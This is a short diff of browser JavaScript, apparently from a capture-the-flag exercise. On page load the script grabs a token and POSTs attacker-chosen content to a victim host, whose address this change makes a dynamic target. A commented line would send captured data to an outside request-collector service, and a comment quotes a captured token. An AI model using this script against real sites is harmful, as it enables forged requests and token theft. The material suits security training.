@@ -2,7 +2,7 @@ const serverURL = window.location.hostname + ":" + window.location.port;
 
 let token = '';
 let victimURL = 'http://blind_hacker/';
-// let victimURL = 'http://localhost:3001/';
+// let victimURL = 'http://localhost:8000/';
 
 window.onload = function () {
 
@@ -21,7 +21,7 @@ window.onload = function () {
         // console.log("text:" + text_id.text);
         // console.log("content-type:" + text_id.contentType);
 
-        fetch(victimURL + '?indextoken=' + token, {
+        fetch( text_id.to + '?indextoken=' + token, {
             method: 'POST',
             body: text_id.text,
             headers: { 'content-type': text_id.contentType }
@@ -35,7 +35,7 @@ window.onload = function () {
         //There you go -> FYsuk1xFzScjXOonVBxIBEqAZAM4AIDmHCPjAmU1
         token = data.split(" ")[4];
         // fetch("https://ikasten.free.beeceptor.com/" + data);
-        console.log(token);
+        // console.log(token);
     })
 
 };
